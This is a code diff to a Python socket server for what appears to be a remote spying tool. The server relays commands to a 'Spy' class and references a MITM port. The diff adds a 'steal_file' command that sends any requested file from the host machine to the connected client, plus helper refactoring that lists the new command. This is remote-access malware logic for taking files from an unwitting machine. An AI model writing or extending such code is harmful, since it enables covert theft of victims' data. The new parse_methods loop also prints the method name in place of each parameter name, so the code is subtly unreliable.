@@ -1,6 +1,5 @@
-from typing import Optional, Tuple
+from typing import Optional, Tuple, List, Callable
 import socket
-from consts import *
 from . import *
 from spying import Spy
 from inspect import signature
@@ -51,18 +50,17 @@ class Server:
                 if len(params) == 1:
                     return self.execute_command(command, [params[0], self.client_address[0], MITM_DEFAULT_PORT])
             case "get_commands":
-                return get_commands(Spy)
-
-
-
+                return get_commands(Spy) + parse_methods([(self.steal_file, "steal_file")])
 
         # if command in SPY_COMMANDS:
         #     command = SPY_COMMANDS[command]
         function = getattr(self.spy, command, None)
         if not function:
-            if command in OTHER_COMMANDS:
-                pass
-            return str(Massages.INVALID_COMMAND.value)
+            match command:
+                case "steal_file":
+                    function = self.steal_file
+                case _:
+                    return str(Massages.INVALID_COMMAND.value)
         if not is_valid_num_of_params(function, len(params)):
             return str(Massages.INVALID_NUMBER_OF_PARAMS.value)
         if not cast_params(function, params):
@@ -78,6 +76,9 @@ class Server:
             return str(Massages.OK.value if result else Massages.NOT_OK.value)
         else:
             return str(result)
+
+    def steal_file(self, path: str) -> bool:
+        return send_file(path, self.client)
 
 
 def is_valid_num_of_params(func: callable, num: int) -> bool:
@@ -105,6 +106,9 @@ def cast_params(func: callable, params: list) -> bool:
     for name, param in sig.parameters.items():
         if name == "self":
             continue
+        if param.default != param.empty and i >= len(params):
+            params.append(param.default)
+            continue
         if params[i] == Massages.DEFAULT_PARAM.value:
             if param.default == param.empty:
                 return False
@@ -126,13 +130,24 @@ def get_commands(cls: type) -> str:
     """
     gets a class and return a message with all its methods and their params
     """
-    method_list = [method for method in dir(cls) if not method.startswith('__')]
+    method_list = [(getattr(cls, method), method) for method in dir(cls) if not method.startswith('__')]
     msg = "the available commands are: \n"
-    for method in method_list:
-        msg += f"{method} - \n"
-        sig = signature(getattr(cls, method))
-        for name, param in sig.parameters.items():
+    msg += parse_methods(method_list)
+    return msg
+
+
+def parse_methods(method_list: List[Tuple[Callable, str]]):
+    """
+    gets a list if tuples of nethod and name and return a descryption of each method
+    """
+    msg = ""
+    for method, name in method_list:
+        msg += f"{name} - \n"
+        sig = signature(method)
+        for par_name, param in sig.parameters.items():
             msg += f"\t{name}: \n" \
                    f"\t\tType: {param.annotation if param.annotation != param.empty else 'any'} \n" \
                    f"\t\tDefault: {param.default if param.default != param.empty else 'no default value'} \n"
     return msg
+
+
